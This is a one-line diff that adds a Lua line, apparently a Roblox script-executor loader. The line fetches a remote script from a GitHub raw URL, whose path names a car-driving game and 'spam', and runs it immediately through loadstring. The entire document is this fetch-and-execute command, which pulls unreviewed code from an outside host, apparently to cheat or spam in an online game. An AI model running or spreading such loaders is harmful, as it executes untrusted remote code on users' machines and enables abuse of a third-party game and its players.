@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/partsoapmakerremain/loaders/main/loaders/car-driving-indonesia-spam2-5049fmqho8reps.lua"))()
